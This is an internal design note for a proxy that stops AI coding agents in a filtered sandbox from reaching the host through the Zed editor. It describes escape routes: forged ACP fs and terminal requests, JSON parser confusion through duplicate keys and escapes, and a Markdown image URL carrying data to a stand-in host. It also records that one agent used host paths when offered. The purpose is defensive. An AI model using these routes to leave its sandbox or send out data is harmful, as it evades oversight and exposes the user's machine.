---
name: acp-editor-host-access
description: a filtered session's box cannot reach the host through the editor; what it may still ask, and why lines are read strictly
subsystem: acp
sources: [internal/acpproxy/host_access.go, internal/acpproxy/image_guard.go, internal/acpproxy/markdown_images.go, internal/acpproxy/proxy.go, internal/cli/acp_cmd.go, internal/cli/fork_acp.go, internal/box/editor_box_wait_live_test.go]
updated: 2026-11-04
---
ACP's `fs/*` and `terminal/*` run on the editor's computer, outside the box, and a login button can run
a command there. Any program in a box can write these straight onto the adapter's stdout: from inside a
real filtered box, forged requests reached the editor. The owner decided on 2026-11-03 that a filtered
session may not do this. Nobody decided for open or offline sessions, which keep the channel.

With `RunOpts.NoEditorHostAccess` (set where `a.acpCapture != nil`, this repo's "filtered" test):
- the editor's `fs`, `terminal` and `elicitation.url` capabilities are removed from `initialize`, also on
  replay and resume;
- a box may send only `session/update`, `session/request_permission`, a form-mode `elicitation/create`, and
  lines with no method (responses). Anything else is refused with an error, or dropped if it has no id, so a
  method ACP adds later is closed by default;
- login buttons are hidden at the last write, because a fork's hooks do not hide them.

Keep form questions open: Claude's `AskUserQuestion` depends on them (Zed advertises `elicitation.form`, and the
adapter keeps the tool enabled because of it), and a form can only ask the person. URL mode opens a link the box
chose, so it stays closed; Claude's MCP sign-in by link needs it and does not work in a filtered session.

Traps:
- **Box lines reach the editor whole in two places:** `pumpChild` and `answerInitialize`, and a new write of a
  box's line must go through `p.forEditor`. Replay's `process` drops requests. The other writes are `session/update`
  lines Coop builds, with box text inside.
- **Read lines strictly.** Go's JSON folds key case and keeps the last duplicate, so the proxy's own `parse` can
  see `session/update` where an editor sees `terminal/create`. A carriage return is whitespace to JSON and a line
  end to Java's `readLine`. `readBoxLine` refuses all of these.
- **Do not search bytes for a key.** A key can be written with JSON escapes (`auth\u004dethods`), which is why
  `HideAuthenticationMethods` decodes every line. Tool input can decode such an escape on its way into a test
  file, so tests build it at runtime.
- **The trace prints `box→editor` before the guard.** A `refused` line right after it means it never left.

Measured with this closed, one real prompt each: Claude, Codex, Gemini and Grok asked the editor for nothing
and wrote the file inside the box. Before it, Gemini read and wrote through the editor at host paths when
offered; Claude and Codex never asked.
Dropped today with no effect in Zed: `_auth/status_update` (Claude) and `_x.ai/*` (Grok).

**Images.** Zed loads an image in an agent's Markdown by itself (`resolve_agent_image` in its `agent_ui.rs`), so
`![x](https://example.org/?data=...)` would carry data out with no click. It also looks a path up in the project and
follows a symlink, so a box can point `![x](a.png)` at anything the host can open, such as a network mount. In a
filtered session `p.out` is an `imageGuard` (`image_guard.go`), which reads every line for the editor, Coop's own
too, because they quote a box's words. Its `imageEscaper` (`markdown_images.go`) knows two rules and no block
structure: `![text](address` gets `\!`, and a definition, `[label]: address`, gets `]\:`, so `![a]` and `![a][b]` have
nothing to load. Only `![text](data:...)` may stay an image. Traps:
- **`data:` is not enough.** Zed decodes a `data:` address only for a type it knows with base64 that passes strict
  rules (`z_markdown.rs`). Anything else falls through to the path lookup, so `![x](data:a)` loads a project file a box
  named `data:a`. The escaper keeps only `data:image/{png,jpeg,gif,webp};base64,` with strictly valid base64 and nothing
  else up to the `)`, no title and no capitals. SVG is left out because it can refer to other files.
- **Definitions.** A label starts a line, so this keys on `[` there instead of on `]:`, which keeps `a[0]: b`. "There"
  means after any bytes of indent, `>` or list markers: an indent can be any depth inside a list, so the three-space
  limit does not hold. A footnote's body is a container too, but `[^1]: ` itself gets the backslash, which also ends the
  container. A label holds no `[` and no blank line, which ends the read early. A `[` still open at a pause gets `\[`.
  No definition stays, even with image data: goldmark starts a new one right after a title, on the same line.
- **Chunks.** Zed joins a message's chunks with nothing between them, so a box can split the syntax at any byte. The
  guard holds back only what could still become an image, and sends it before the session's next other line. A
  `!` or `]` sent that way goes raw, and the next text is guarded if it starts with `[`, `(` or `:`, because Zed
  will add a chunk that arrives after the turn's answer to the same message.
- **Backslash runs.** A held backslash is doubled at a pause, so it cannot hide or reveal what comes next. A backslash
  before a line break still ends the line.
- **Pauses.** The text after a pause may be a new Markdown, so it counts as a line start, whatever came before.
- **Links.** Zed writes a `resource_link` into the message as `[@name](uri)`, with the name decoded from the uri, or
  as the bare uri if it cannot read it. No backslash can fix that, so a line whose uri spells an image, or ends in
  something the next chunk could finish, is dropped. A `]:` anywhere counts, because `[@a]:b](uri)` is a definition.
- **What is not Markdown.** A raw tool value that is not a string is printed as JSON in a fence that JSON cannot
  close, and diffs and terminal output are not Markdown either, so these stay byte for byte.
- **Parsers.** goldmark stands in for pulldown-cmark in the tests but does not read a footnote's body as a container.
  `<img>` does not load, since a thread's Markdown has `parse_html` off.
- **The price.** In a code block these show a backslash: an image spelled out, and a line that starts like a definition,
  such as `[key: string]: number;`. Telling code from text would mean trusting a parser that can disagree with the
  editor's. Outside a code block the backslash does not show, but a reference link's definition and a footnote's stop
  working, a `data:` image over 16 KB in text becomes a link, and a resource link with `]:` in it, such as an IPv6 port,
  is dropped. An image block the agent sends is not Markdown and is not touched.

Not closed: a `session/update` can name paths (tool call `locations`, resource links) the editor may show or open, and links a
person can click. The agent gets nothing back from those. Mermaid fences render in the thread, and Zed's renderer for
them was not read.

Proof: `host_access_test.go`, `image_guard_test.go`, `markdown_images_test.go`, and
`TestRestrictedNetworkBoxCannotReachTheHostThroughTheEditor` on real Docker, which spends one short prompt. Real Zed
cannot be driven from an agent session, so it is read from source at v1.26.2.

## Changelog
- 2026-11-03 — created with the guard. Verified on real Docker: with the guard off the live test fails with
  the forged methods in the editor's list.
- 2026-11-04 — remote images closed. Checked against pulldown-cmark 0.13 with Zed's options on 700,000 random and
  hostile documents with no remote image left, and on a real filtered box with an image split across two writes.
- 2026-11-04 — every image but decodable `data:` closed, on the owner's answer. Definitions now key on a line-start
  `[`. Zed's `data:` fallback to a path, read from its source, ruled out accepting the bare prefix. Checked against
  pulldown-cmark 0.13 and goldmark on 1.4 million random and hostile documents, with every split of the tables.
